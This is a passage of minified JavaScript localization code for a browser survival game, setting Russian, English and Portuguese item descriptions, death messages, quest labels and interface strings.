        ve[le.BUCKET_FULL] = ["Ведро", "Используется для заполнения колодца", "Одно ведро равняется двенадцати бутылкам"];
        ve[le.BUCKET_EMPTY] = ["Пустое ведро", "Вам надо заполнить это ведро возле воды"];
        ve[le.BOTTLE_FULL] = ["Бутылка", "Позволяет пить воду в любом месте", "Вода: 50"];
        ve[le.BOTTLE_EMPTY] = ["Пустая бутылка", "Вы можете заполнить бутылку возле воды"];
        ve[le.WATERING_CAN] = ["Пустая Лейка", "Вы можете заполнить лейку возле воды"];
        ve[le.WATERING_CAN_FULL] = ["Лейка", "Позволяет поливать растения", "Урон: 1"];
        ve[le.BAG] = ["Рюкзак", "Больше места для ваших предметов!"];
        ve[le.PAPER] = ["Бумага", "Используется при создании книги"];
        ve[le.BOOK] = ["Книга", "Сокращает время изготовления предметов", "Должно быть одето для работы", "Урон: 1"];
        ve[le.BANDAGE] = ["Бинт", "Восстанавливает ваше здоровье быстрее", "Лечит: 30", "Эффект: 5"];
        ve[le.LOCK] = ["Замок", "Позволяет вам закрыть ваш сундук"];
        ve[le.LOCKPICK] = ["Ключ", "Даёт вам открыть один запертый сундук"];
        ve[le.TOTEM] = ["Тотем", "Позволяет вам создать команду", "Совместное использование дверей и сундуков", "Вредное здание не повредит вашего друга"];
        ve[le.BRIDGE] = ["Мост", "Очень полезно на воде", "Позволяет вам пить без потери воздуха", "Передвигаетесь быстрее по воде"];
        ve[le.SIGN] = ["Табличка", "Оставьте сообщение другим", "Прочность: 200"];
        ve[le.ROOF] = ["Крыша", "Немного скрывает вас и согревает!"];
        ve[le.WELL] = ["Колодец", "Позволяет заполнить бутылку", "Прочность: 1000"];
        ve[le.WALL] = ["Деревянная Стена", "Это просто стена", "Прочность: 1000"];
        ve[le.STONE_WALL] = ["Каменная Стена", "Это немного посерьезнее.", "Прочность: 1500"];
        ve[le.GOLD_WALL] = ["Золотая Стена", "Золото на ваших стенах? Она ослепляет.", "Прочность: 2000"];
        ve[le.DIAMOND_WALL] = ["Алмазная Стена", "Очень блестит, следите за вашими глазами", "Прочность: 2500"];
        ve[le.AMETHYST_WALL] = ["Аметистовая стена", "Вы должны быть слишком напуганы, чтобы уйти!", "Прочность: 3500"];
        ve[le.SPIKE] = ["Деревянная Стена с Шипами", "Может наносить урон врагам", "Урон: 10, Урон за один удар: 2", "Прочность: 150"];
        ve[le.STONE_SPIKE] = ["Каменная Стена с Шипами", "Я не хотел бы быть вашим врагом", "Урон: 20", "Урон за один удар: 3", "Прочность: 300"];
        ve[le.GOLD_SPIKE] = ["Золотая Стена с Шипами", "Вы очень жестоки.", "Урон: 30", "Урон за один удар: 3", "Прочность: 600"];
        ve[le.DIAMOND_SPIKE] = ["Алмазная Стена с Шипами", "Вам не нравится иметь компанию.", "Урон: 40", "Урон за один удар: 4", "Прочность: 1200"];
        ve[le.AMETHYST_SPIKE] = ["Аметистовая Стена с Шипами", "Какого черта, что ваши соседи сделали с вами?", "Урон: 50", "Урон за один удар: 4", "Прочность: 2400"];
        ve[le.WOOD_DOOR] = ["Деревянная Дверь", "Может быть открыта и закрыта вами или друзьями", "Прочность: 1000"];
        ve[le.STONE_DOOR] = ["Каменная Дверь", "Более серьезная и сильная дверь", "Прочность: 1500"];
        ve[le.GOLD_DOOR] = ["Золотая Дверь", "Вы перестраиваете \"Эль Дорадо?\"", "Прочность: 2000"];
        ve[le.DIAMOND_DOOR] = ["Алмазная Дверь", "Для роскошного дома", "Прочность: 2500"];
        ve[le.AMETHYST_DOOR] = ["Аметистовая Дверь", "Ваш дом в безопасности?", "Прочность: 3000"];
        ve[le.FURNACE] = ["Печь", "Согревает", "Тратит дерево каждые 5 секунд", "Прочность: 1000"];
        ve[le.WINDMILL] = ["Мельница", "Может сделать муку из пшеницы", "Требует 5 секунд для получения муки", "Даёт очки при работе", "Прочность: 2000"];
        ve[le.BREAD_OVEN] = ["Хлебная Печь", "Позволяет готовить хлеб из муки", "Требует 10 секунд для получения хлеба", "Даёт очки при работе", "Прочность: 2000"];
        ve[le.RESURRECTION] = ["Камень Воскрешения", "Это магия", "Воскрешает вас, если вы призрак", "Вы потеряете своё оружие", "Прочность: 200"];
        ve[TEXT.YOU_CANNOT_JOIN] = "Вы не можете зайти на этот сервер";
        ve[TEXT.KICKED] = "Выгнаны: ";
        ve[TEXT.KEY_ALREADY] = "Ваш ключ уже используется кем-то";
        ve[TEXT.KEY_WRONG] = "Ваш ключ неправильный";
        ve[TEXT.OLD_VERSION] = "У вас старая версия, вам нужно очистить кеш";
        ve[TEXT.NO_MORE_RESOURCES] = "Ресурсов больше нет";
        ve[TEXT.SURVIVED_1DAY] = "Вы выжили 1 день";
        ve[TEXT.SURVIVED] = "Вы выжили ";
        ve[TEXT.DAYS] = " дней";
        ve[TEXT.DEAD_SAD] = "Вы умерли ;-;";
        ve[TEXT.SPAM_ME] = "Сервер не может найти точку спавна! Спамьте кнопку играть!";
        ve[TEXT.SPAM_ME2] = "Сервер заполнен! Спамьте кнопку играть!";
        ve[TEXT.EMPTY] = "Ресурсы закончились";
        ve[TEXT.INV_FULL] = "Инвентарь заполнен (правая кнопка мыши для удаления предметов)";
        ve[TEXT.DEAD] = " умер";
        ve[TEXT.WRONG_TOOL] = "Это не тот инструмент";
        ve[TEXT.JOIN_TEAM] = "Вы вошли в команду";
        ve[TEXT.YOU_DEAD] = "Вы умерли";
        ve[TEXT.JOINED_TEAM] = " вошёл в команду";
        ve[TEXT.TEAM_DESTROYED] = "Ваша команда была разрушена";
        ve[TEXT.LEFT_TEAM] = "Вы покинули команду";
        ve[TEXT.LEFT_TEAM2] = " покинул команду";
        ve[TEXT.TOKEN] = "Кто-то использует ваш токен :>";
        ve[TEXT.CHOOSE] = "Выберите сервер";
        ve[TEXT.PLAYERS] = "игроков";
        ve[TEXT.TOTAL_PLAYERS] = "игроков всего";
        ve[TEXT.TOTAL_MODE] = "игроков в этом режиме";
        ve[TEXT.COMMING_SOON] = "Скоро...";
        document.getElementById("nickname_input").placeholder = "Имя";
        Le[0] = ["Вы были убиты без причины"];
        Le[1] = ["Вы умерли от голода, как название игры подразумевает это"];
        Le[2] = ["Вы замерзли до смерти. Так грустно", "У вас гипотермия. В следующий раз, постарайтесь быть рядом с огнём."];
        Le[3] = ["Игрок убил тебя и сказал 'стань лучше.'", "Ты был убит игроком. Не волнуйся, этот игрок тоже умрёт, в конце концов."];
        Le[4] = ["Вы стояли слишком близко к огню и сгорели. Плохая идея.", "Ты умер от огня, он причинил вам боль. Напишите историю насчёт этого."];
        Le[5] = ["Ваше тело станет гнездом для яиц паука", "Паук убил вас. По крайней мере это был не кролик."];
        Le[6] = ["Волк больше не будет голодать после того, как наелся вами", "Они не собаки. Волки не любят ласкаться."];
        Le[7] = ["Лиса была слишком быстрой для вас", "Лиса превратила тебя в ящик. С каких пор животные обладают магическими способностями?"];
        Le[8] = ["Медведь просто хотел обнять тебя.", "Медведь был слишком грустным. Мне не жаль."];
        Le[9] = ["Вы были сожжены драконом. Так грустно.", "Вы были сплющены драконом. Быть раздавленным - это ужасный способ умереть."];
        Le[10] = ["Вы прыгнули в стену с шипами. Плохая идея...", "Вы были убиты стеной с шипами. Большинство людей достаточно разумны, чтобы не касаться острых вещей."];
        Le[11] = ["Даже призрак может умереть.", "Вы не смогли воскреснуть. Это игра, и вы можете возвращаться к жизни после смерти, так что..."];
        Le[12] = ["Бактерия из вашей сырой пищи убила вас. Эта игра безусловно сложна.", "Вы убили сырую пищу. Она тоже тебя убила."];
        Le[13] = ["Вы умерли от жажды. Лучше пить собственную мочу."];
        Le[14] = ["Знаешь ли ты, что у голодающих рот всегда под водой, когда они плавают? Теперь ты знаешь."];
        Le[15] = ["Не волнуйся, пиранья сочла тебя вкусным.", "Веселый факт: Пираньи едят людей. В том числе тебя."];
        Le[16] = ["LapaMauve не планировал, что ты убьёшь кракена", "Крак! Кракен сломал твой череп."];
        Le[17] = ["Твоя кожа разваливается, солнце убило тебя"];
        Le[18] = ["Чеснок, хранящийся в твоих карманах сварил твой мозг."];
        Le[19] = ["Не стоит стоять рядом с чесночным зубком, когда вы вампир."];
        Le[20] = ["Вы вампир, Вы ели чеснок, чего вы ожидали?"];
        Le[21] = ["Ваше тело застревает в шипах, когда вы пытаетесь убежать, ваша кожа отрывается, и ваше сердце перестает биться."];
        ZOMBIE_GRUMBLE = "Uuunnnggg";
        ZOMBIE_GRUMBLES = ["Uuunnnggg... Я голоден", "Нужны твои мозги Uuunnnggg...", "Свежее мясо здесь... Uuunnnggg", "Uuunnnggg... Ты вкусный", "Uuunnnggg...", "Еда… Uuunnnggg...", "Я чувствую запах крови... Uuunnnggg"];
      }, be = function () {
        ve[le.DRAGON_CUBE] = ["You feel a great power emanating from this orb"];
        Le[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."];
        ve[le.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"];
        ve[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME";
        ve[TEXT.TWITTER] = " Share on Twitter";
        ve[TEXT.FACEBOOK] = " Share on Facebook";
        ve[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points";
        ve[TEXT.POINTS] = "points";
        ve[TEXT.SCORE] = "Score";
        ve[TEXT.KILL] = "Kill";
        ve[TEXT.DAYS_SURVIVED] = "Days survived";
        ve[TEXT.MODE_FREE] = "Building method: Free. Press G to change";
        ve[TEXT.MODE_GRID] = "Building method: Grid. Press G to change";
        ve[le.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"];
        ve[le.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"];
        ve[le.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"];
        ve[le.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"];
        document.getElementById("typequest").innerHTML = "Chrono Quests";
        document.getElementById("timeremainingquest").innerHTML = "Time Remaining";
        document.getElementById("constraintquest").innerHTML = " Constraints";
        document.getElementById("claim_rewards").innerHTML = " Claim rewards";
        document.getElementById("rewardquest").innerHTML = " Reward";
        document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart";
        document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst";
        document.getElementById("survive20min_3").innerHTML = "Survive without losing life";
        document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests";
        document.getElementById("dont_hit_5").innerHTML = " Be peaceful";
        document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter";
        document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
        for (var e = 0; e < 7; e++) {
          document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
        }
        document.getElementById("quit_chronoquest").innerHTML = " QUIT";
        ve[le.HAND] = ["mão"];
        ve[le.GROUND] = ["terra", "está sujo!"];
        ve[le.SAND] = ["areia", "entrou nos meus olhos!"];
        ve[le.WOOD] = ["madeira", "você não pode pegar o suficiente disso!"];
        ve[le.STONE] = ["pedra", "também chamado rocha"];
        ve[le.GOLD] = ["ouro", "seja generoso, dê para outros"];
        ve[le.DIAMOND] = ["diamante", "o que você irá fazer com isso?"];
        ve[le.AMETHYST] = ["ametista", "é mauve como lapa"];
        ve[le.FLOUR] = ["farinha", "usada na cozinha"];
        ve[le.COOKIE] = ["biscoito", "biscoito da vovó", "comida: 50"];
        ve[le.CAKE] = ["bolo", "bolo dos sonhos para gourmets", "comida: 100"];
        ve[le.MEAT] = ["carne crua", "você pode cozinhar na fogueira", "envenenamento por comida: 10", "comida: 15"];
        ve[le.COOKED_MEAT] = ["carne assada", "um mal passado, por favor", "comida: 35"];
        ve[le.FOODFISH] = ["peixe cru", "eu acho que ainda está vivo", "causa envenenamento por comida: 10", "comida: 18"];
        ve[le.FOODFISH_COOKED] = ["peixe assado", "com limão é perfeito", "comida: 35"];
        ve[le.BREAD] = ["pão", "um excelente pão francês", "é a moeda do mercado", "comida: 15"];
        ve[le.SANDWICH] = ["sanduíche", "saboroso com rissol de krabby", "comida: 100"];
        ve[le.CANDY] = ["doces", "apenas para crianças!", "comida: 100"];
        ve[le.SUGAR_CAN] = ["cana-de-açúcar", "prove, é delicioso!", "comida: 100"];
        ve[le.GARLAND] = ["pisca-pisca", "decoração perfeita de telhado"];
        ve[le.SEED] = ["sementes de berries", "cresce como berrie", "nasce em: 2min", "cresce em: 55s", "precisa de água em: 3min 20s", "durabilidade: 700", "tempo de vida: 8 dias"];
        ve[le.PLANT] = ["berry", "Berry saborosa!", "comida: 10"];
        ve[le.WHEAT_SEED] = ["semente de trigo", "cresce como trigo", "nasce em: 2min", "cresce em: 16s", "precisa de água em: 2min", "durabilidade: 700", "tempo de vida: 8 days"];
        ve[le.WILD_WHEAT] = ["planta selvagem", "vira farinha quando coloca em um moinho de vento"];
        ve[le.PUMPKIN_SEED] = ["semente de abóbora", "cresce como abóbora", "nasce em: 2min 40s", "cresce em: 2min", "precisa de água em: 2min", "durabilidade: 700", "tempo de vida: 8 dias"];
        ve[le.PUMPKIN] = ["abóbora", "é a lembrança do halloween", "comida: 30"];
        ve[le.GARLIC_SEED] = ["semente de alho", "muito perigoso para vampiros", "dano: 20", "nassce: 4min", "cresce em: 1min 10s", "precisa de água em: 1min 40s", "durabilidade: 700", "tempo de vida: 8 dias"];
        ve[le.GARLIC] = ["alho", "cura você e reduz o frio", "comida: 14", "cura ao longo do tempo: 30", "efeito: 1"];
        ve[le.THORNBUSH_SEED] = ["semente de mato de espinhos", "pode dar dano nos seus inimigos", "dano: 20", "nasce em: 4min", "cresce em: 15s", "precisa de água em: 3min", "durabilidade: 1000", "tempo de vida: 8 days"];
        ve[le.THORNBUSH] = ["mato de espinhos", "pica!"];
        ve[le.PLOT] = ["pote", "sério, use isso", "com esse GMO fertilize suas plantas", "vai crescer mais rápido e com menos água", "durabilidade: 2000"];
        ve[le.ICE] = ["gelo", "útil para fazer bolo e água"];
        ve[le.SPANNER] = ["chave inglesa", "para reparar portas, muros e muros com espinho", "dano: 2"];
        ve[le.FUR_WOLF] = ["pele de lobo", "cachorro? mas onde está o cachorro?!"];
        ve[le.FUR] = ["pele de coelho", "o coelho era tão fofo..."];
        ve[le.SPECIAL_FUR] = ["pele pura", "você é uma fábrica de pão"];
        ve[le.SPECIAL_FUR_2] = ["pele negra", "você está pronto para fazer algo errado"];
        ve[le.FUR_WINTER] = ["pele de inverno", "ele só queria um abraço"];
        ve[le.SCALES] = ["escala", "é pequeno como peixe!"];
        ve[le.KRAKEN_SKIN] = ["pele do kraken", "você não está com medo?"];
        ve[le.FIRE] = ["fogueira", "esquenta você!", "durabilidade: 150", "tempo de vida: 2min"];
        ve[le.BIG_FIRE] = ["fogueira grande", "te esquenta por mais tempo!", "durabilidade: 400", "tempo de vida: 6min"];
        ve[le.WORKBENCH] = ["mesa de trabalho", "muito útil para fazer todos os objetos"];
        ve[le.CORD] = ["linha", "usada para fazer chapéus e mochila"];
        ve[le.BLUE_CORD] = ["linha de diamante", "usada para fazer chapéus especiais"];
        ve[le.CHEST] = ["baú", "permite que você guarde itens", "durabilidade: 500"];
        ve[le.SWORD_WOOD] = ["espada de madeira", "isso funciona?", "dano: 12", "dano em construções: 4"];
        ve[le.SWORD] = ["espada de pedra", "seja legal com outros", "dano: 19", "dano em construções: 6"];
        ve[le.SWORD_GOLD] = ["espada de ouro", "rei da floresta", "dano: 22", "dano em construções: 7"];
        ve[le.SWORD_DIAMOND] = ["espada de diamante", "você pode sentir o poder", "dano: 24", "dano em construções: 8"];
        ve[le.PIRATE_SWORD] = ["espada de pirata", "AYYYYY!", "alcança mais distância que a espada normal", "dano: 24", "dano em construções: 8"];
        ve[le.SWORD_AMETHYST] = ["espada de ametista", "mauve é a cor mais bonita do mundo", "dano: 27", "dano em construções: 9"];
        ve[le.DRAGON_SWORD] = ["espada do dragão", "sem piedade!", "dano: 30", "dano em construções: 10"];
        ve[le.DRAGON_SPEAR] = ["lança do dragão", "mate todos eles!", "dano: 22", "dano em construções: 6"];
        ve[le.PICK_WOOD] = ["picareta de madeira", "pode coletar apenas madeira e pedra", "dano: 1"];
        ve[le.PICK_STONE] = ["picareta de pedra", "pode coletar madeira, pedra e ouro", "dano: 2"];
        ve[le.PICK_GOLD] = ["picareta de ouro", "pode coletar diamante", "dano: 3", "dano em construções: 1"];
        ve[le.PICK_DIAMOND] = ["picareta de diamante", "pode coletar tudo", "dano: 4", "dano em construções: 1"];
        ve[le.PICK_AMETHYST] = ["picareta de ametista", "pode coletar tudo, parece fantastico!", "dano: 5", "dano em construções: 1"];
        ve[le.HAMMER] = ["martelo de pedra", "útil para destruir construções", "não funciona bem no diamante e na ametista", "dano: 2", "dano em construções: 20"];
        ve[le.HAMMER_GOLD] = ["martelo de ouro", "útil para destruir construções", "não funciona bem na ametista", "dano: 3", "dano em construções: 30"];
        ve[le.HAMMER_DIAMOND] = ["martelo de diamante", "útil para destruir construções", "dano: 4", "dano em construções: 40"];
        ve[le.HAMMER_AMETHYST] = ["martelo de ametista", "útil para destruir construções", "dano: 5", "dano em construções: 50"];
        ve[le.SUPER_HAMMER] = ["super martelo", "você planeja destruir o mundo?", "dano: 12", "dano em construções: 70"];
        ve[le.WOOD_SPEAR] = ["lança de madeira", "parece um graveto de madeira mas pica.", "dano: 10", "dano em construções: 2"];
        ve[le.SPEAR] = ["lança de pedra", "o começo da evolução!", "dano: 14", "dano em construções: 4"];
        ve[le.GOLD_SPEAR] = ["lança de ouro", "cuidado, pica!", "dano: 15", "dano em construções: 5"];
        ve[le.DIAMOND_SPEAR] = ["lança de diamante", "você está pronto para matar um dragão", "Dano: 17", "dano em construções: 5"];
        ve[le.AMETHYST_SPEAR] = ["lança de ametista", "dragões não te amedrontam", "Dano: 18", "dano em construções: 6"];
        ve[le.SHOVEL] = ["pá de pedral", "cave o chão para pegar terra, areia e gelo", "você também pode pegar minerais", "dano: 2"];
        ve[le.SHOVEL_GOLD] = ["pá de ouro", "cave o chão para pegar terra, areia e gelo", "você também pode pegar minerais", "dano: 3", "dano em construções: 1"];
        ve[le.SHOVEL_DIAMOND] = ["pá de diamante", "cave o chão para pegar terra, areia e gelo", "você também pode pegar minerais", "dano: 4", "dano em construções: 1"];
        ve[le.SHOVEL_AMETHYST] = ["pá de ametista", "cave o chão para pegar terra, areia e gelo", "você também pode pegar minerais", "dano: 5", "dano em construções: 1"];
        ve[le.WOOD_HELMET] = ["capacete de madeira", "melhor que nada", "defesa de jogadores: 1", "defesa de animais: 4"];
        ve[le.STONE_HELMET] = ["capacete de pedra", "você está pronto para a batalha!", "defesa de jogadores: 2", "Animals Defense: 8"];
        ve[le.GOLD_HELMET] = ["capacete de ouro", "AKA o capacete dos selvagens", "defesa de jogadores: 4", "defesa de animais: 13"];
        ve[le.DIAMOND_HELMET] = ["capacete de diamante", "não se precipite tanto", "defesa de jogadores: 5", "defesa de animais: 19"];
        ve[le.AMETHYST_HELMET] = ["capacete de ametista", "você não tem medo de mais nada", "defesa de jogadores: 6", "defesa de animais: 23"];
        ve[le.DRAGON_HELMET] = ["capacete do dragão", "você vai conquistar o mundo", "defesa de jogadores: 8", "defesa de animais: 27"];
        ve[le.EXPLORER_HAT] = ["chapéu de explorador", "animais não vão te atacar", "mas não faça barulho!", "quente fora da água"];
        ve[le.CHRISTMAS_HAT] = ["gorro de natal", "Oh, oh, oh, feliz natal", "quente fora da água e neve"];
        ve[le.ELF_HAT] = ["chapéu de elfo", "não deixe-se ser explorado, seu pequeno elfo de neve!", "quente fora da água e neve"];
        ve[le.HOOD] = ["capuz", "você é um trapaceiro", "você pode roubar alguém apenas se", "1) é de noite", "2)você não está segurando nada", "3) se você n foi tocado por 5 segundos", "4) você não está perto de uma fogueira", "5) seu alvo não está com equipamento camponês", "quente fora da água e na neve"];
        ve[le.EARMUFFS] = ["protetor de orelhas", "algum tipo de chapka pequena.", "quente fora da água e neve"];
        ve[le.COAT] = ["Chapka", "também chamado de casaco.", "esquenta fora da água e na neve", "muito quente"];
        ve[le.CAP_SCARF] = ["Chapéu de inverno", "Muito confortável", "Muito quente"];
        ve[le.PEASANT] = ["túnica", "suas plantas crescem rápido", "quente fora da água e na neve"];
        ve[le.WINTER_HOOD] = ["capuz de inferno", "você só pode roubar alguém se", "é de noite", "-você não está segurando nada", "- se você não foi tocado por 4 segundos", "- você não está perto de uma fogueira", "-seu alvo não está com equipamento de camponês de inverno", "esquenta fora da água e na neve"];
        ve[le.WINTER_PEASANT] = ["camponês de inverno", "suas plantas crescem rápido", "quente fora da água e na neve"];
        ve[le.DIVING_MASK] = ["máscara de mergulho", "você é rápido na água", "quente na água", "defesa de jogadores: 2, defesa de animais: 8"];
        ve[le.SUPER_DIVING_SUIT] = ["super máscara de mergulho", "você é muito rápido na água", "quente na água", "defesa de jogadores: 4, defesa de animais: 16"];
        ve[le.DRAGON_ORB] = ["esfera do dragão", "dado na questt"];
        ve[le.DRAGON_HEART] = ["coração de dragão", "torna você num fantasmas na morte!", "você é um fantasma por 60 segundos", "ache uma pedra da ressurreição"];
        ve[le.GEMME_GREEN] = ["pedra verde", "você não vai trapacear, promete?"];
        ve[le.GEMME_ORANGE] = ["pedra laranja", "apenas um pirata de verdade pode achar-lo!"];
        ve[le.GEMME_BLUE] = ["pedra azul", "para pessoas muito gentis"];
        ve[le.CROWN_GREEN] = ["coroa verde", "você se regenera muito rápido", "regenera ao longo do tempo: 40", "defesa de jogadores: 4, defesa de animais: 16"];
        ve[le.CROWN_ORANGE] = ["coroa laranja", "de repente você se sente muito sortudo", "defesa de jogadores: 4, defesa de animais: 16"];
        ve[le.CROWN_BLUE] = ["coroa azul", "quando você morrer, você vira um fantasma", "você perderá sua arma", "defesa de jogadores: 4, defesa de animais: 16"];
        ve[le.BUCKET_FULL] = ["balde", "útil para encher um poço", "um balde equivale a doze garrafas"];
        ve[le.BUCKET_EMPTY] = ["balde vazio", "você precisa encher esse balde perto de uma fonte de água"];
        ve[le.BOTTLE_FULL] = ["garrafa", "permite que você beba água em qualquer lugar", "água: 50"];
        ve[le.BOTTLE_EMPTY] = ["garrafa vazia", "você pode encher essa garrafa perto de uma fonte de água"];
        ve[le.WATERING_CAN] = ["regador vazio", "você deve enche-lo com uma fonte de água para usa-lo"];
        ve[le.WATERING_CAN_FULL] = ["regador", "permite regar as plantas", "dano: 1"];
        ve[le.BAG] = ["mochila", "mais espaço para seus itens!"];
        ve[le.PAPER] = ["papel", "usado para fazer o livro"];
        ve[le.BOOK] = ["livro", "permite reduzir consideradamente o tempo de construções", "mas precisa está equipado para fucionar", "dano: 1"];
        ve[le.BANDAGE] = ["bandagem", "recupera sua vida mais rapidamente", "Heal over time: 30", "Effect: 5"];
        ve[le.LOCK] = ["fechadura", "permite você trancar seu baú"];
        ve[le.LOCKPICK] = ["chave", "permite destrancar um baú"];
        ve[le.TOTEM] = ["Totem", "permite você criar um time", "compartilha portas e baús", "edifício prejudicial não quer machucar seu amigo"];
        ve[le.BRIDGE] = ["ponte", "muito útil na água", "permite você beber sem se afogar", "anda rápido na água"];
        ve[le.SIGN] = ["placa", "deixe uma mensagem para outros", "durabilidade: 200"];
        ve[le.ROOF] = ["telhado", "esconde você um pouco e te esquenta!"];
        ve[le.WELL] = ["poço", "permite encher garrafas", "durabilidade: 1000"];
        ve[le.WALL] = ["muro de madeira", "você sabia que o muro dança?", "durabilidade: 1000"];
        ve[le.STONE_WALL] = ["muro de pedra", "é um pocu mais sério.", "durabilidade: 1500"];
        ve[le.GOLD_WALL] = ["muro de ouro", "ouro nos seus muros? é muito chamativo.", "durabilidade: 2000"];
        ve[le.DIAMOND_WALL] = ["muro de diamante", "tão brilhoso, veja seus olhos", "durabilidade: 2500"];
        ve[le.AMETHYST_WALL] = ["muro de ametista", "você está muito assustado de sair!", "durabilidade: 3000"];
        ve[le.SPIKE] = ["espiga de madeira", "pode dar dano nos seus inimigos", "dano: 10, dano no acerto: 2", "durabilidade: 150"];
        ve[le.STONE_SPIKE] = ["espiga de pedra", "eu não quero ser seu inimigo.", "dano: 20", "dano no acerto: 3", "durabilidade: 300"];
        ve[le.GOLD_SPIKE] = ["espiga de ouro", "você é tão cruel.", "dano: 30", "dano no acerto: 3", "durabilidade: 600"];
        ve[le.DIAMOND_SPIKE] = ["espiga de diamante", "você não gosta de ter companhia.", "dano: 40", "dano no acerto: 4", "durabilidade: 1200"];
        ve[le.AMETHYST_SPIKE] = ["espiga de ametista", "o que diabos seu vizinhos fizeram para você?", "dano: 50", "dano no acerto: 4", "durabilidade: 2400"];
        ve[le.WOOD_DOOR] = ["porta de madeira", "pode ser aberta ou fechada por você ou seus amigos", "durabilidade: 1000"];
        ve[le.STONE_DOOR] = ["porta de pedra", "uma porta mais forte é mais sério", "durabilidade: 1500"];
        ve[le.GOLD_DOOR] = ["porta de ouro", "você está re-construindo o el dorado?", "durabilidade: 2000"];
        ve[le.DIAMOND_DOOR] = ["porta de diamante", "para uma casa brilhante", "durabilidade: 2500"];
        ve[le.AMETHYST_DOOR] = ["porta de ametista", "é a sua casa um lugar trancado seguro?", "durabilidade: 3500"];
        ve[le.FURNACE] = ["fornalha", "esquenta você", "consumi madeira em todo 5 segundos", "durabilidade: 1000"];
        ve[le.WINDMILL] = ["moinho de vento", "pode produzir farinha do trigo", "demora 5 segundos para fazer farinha", "dá pontos ao trabalhar", "durabilidade: 2000"];
        ve[le.BREAD_OVEN] = ["forno de pão", "permite fazer pão feito de farinha", "demora 10 segundos para fazer pão", "dá pontos ao trabalhar", "durabilidade: 2000"];
        ve[le.RESURRECTION] = ["pedra da ressurreição", "é mágico", "te ressuscita se você for um fantasmas", "você vai perder sua arma", "durabilidade 200: 200"];
        ve[TEXT.YOU_CANNOT_JOIN] = "você não pode entrar no servidor";
        ve[TEXT.KICKED] = "kickado: ";
        ve[TEXT.KEY_ALREADY] = "sua chave está em uso por outra pessoa";
        ve[TEXT.KEY_WRONG] = "sua chave está errada";
        ve[TEXT.OLD_VERSION] = "você tem uma versão velha, limpe seu cache";
        ve[TEXT.NO_MORE_RESOURCES] = "não tem mais recursos";
        ve[TEXT.SURVIVED_1DAY] = "você sobreviveu 1 dia";
        ve[TEXT.SURVIVED] = "você sobreviveu ";
        ve[TEXT.DAYS] = " dias";
        ve[TEXT.DEAD_SAD] = "você está morto ;-;";
        ve[TEXT.SPAM_ME] = "servidor não pôde achar um local de spawn! spam o botão de play!";
        ve[TEXT.SPAM_ME2] = "servidor está cheio! spam o botão de play!";
        ve[TEXT.EMPTY] = "não tem recursos";
        ve[TEXT.INV_FULL] = "inventário está cheio (botão direito para deletar itens)";
        ve[TEXT.DEAD] = " está morto";
        ve[TEXT.WRONG_TOOL] = "essa não é a ferramenta certa";
        ve[TEXT.JOIN_TEAM] = "você entrou no time";
        ve[TEXT.YOU_DEAD] = "você está morto";
        ve[TEXT.JOINED_TEAM] = "entrou no time";
        ve[TEXT.TEAM_DESTROYED] = "seu time foi destruido";
        ve[TEXT.LEFT_TEAM] = "você saiu do time";
        ve[TEXT.LEFT_TEAM2] = " saiu do time";
        ve[TEXT.TOKEN] = "alguém roubou sua ficha :>";
        ve[TEXT.CHOOSE] = "escolha um servidor";
        ve[TEXT.PLAYERS] = "jogadores";
        ve[TEXT.TOTAL_PLAYERS] = "jogadores totais";
        ve[TEXT.TOTAL_MODE] = "jogadores nesse modo";
        ve[TEXT.COMMING_SOON] = "Coming soon...";
        document.getElementById("nickname_input").placeholder = "Apelido";
        Le[0] = ["você morreu sem motivo"];
        Le[1] = ["você morreu de fome, como o jogo diz"];
        Le[2] = ["você morreu de frio. tão triste", "você pegou hipotermia na próxima vez, tente sentar numa fogueira em vez disso."];
        Le[3] = ["um jogador te matou dizendo a você para matar..'", "você foi morto por um jogador. não se preocupe, aquele jogador morrerá também, eventualmente."];
        Le[4] = ["você ficou muito perto de uma fogueira e queimou até a morte. má ideia.", "você morreu por um incêndio. fogueira te machuca. vá escrever uma história sobre isso."];
        Le[5] = ["seu corpo vai virar um ninho para ovos de aranhas", "uma aranha te matou. pelo menos não era um coelho."];
        Le[6] = ["o lobo não vão morrer de fome depois te te comer", "eles não são cachorros. lobos não gostam de ser que nem animais de estimação."];
        Le[7] = ["a raposa era muito rápida para você", "a raposa te tornou uma caixa. desde quando os animais tem poderes mágicos?"];
        Le[8] = ["o urso só queria um abraço.", " o urso era muito nu. eu não sinto muito."];
        Le[9] = ["você foi queimado por um dragão. tão triste..", "você foi esmagado por um dragão.. ser esmagado é uma maneira horrível de morrer."];
        Le[10] = ["você pulou em um muro com espinhos. não é uma boa ideia...", "você foi morto por um muro com espinhos. muitas pessoas são sensíveis o bastante para não tocar em coisas pontudas."];
        Le[11] = ["até fantasmas podem morrer.", "você falhou para ser ressuscitado. This is a game, so you go to life after you die, so..."];
        Le[12] = ["uma bactéria da sua comida crua te matou esse jogo é definitivamente muito díficil.", "você matou a carne crua. a carne crua te matou também."];
        Le[13] = ["você morreu de sede. melhor beber sua própria urina."];
        Le[14] = ["você sabia que você morre afogado? agora você sabe."];
        Le[15] = ["não se preocupe, as piranhas acham você saboroso.", "fato engraçado: Piranhas comem pessoas. incluindo você."];
        Le[16] = ["LapaMauve não planeja você matar o kraken", "um kraken comeu seu esqueleto."];
        Le[17] = ["sua pele caindo aos pedaços, o sol te matou."];
        Le[18] = ["o alho amarzenado em seus bolsos ferveu seu cérebro."];
        Le[19] = ["como vampiro, não chegue perto do alho."];
        Le[20] = ["você comeu alho como vampiro, o que você esperava?"];
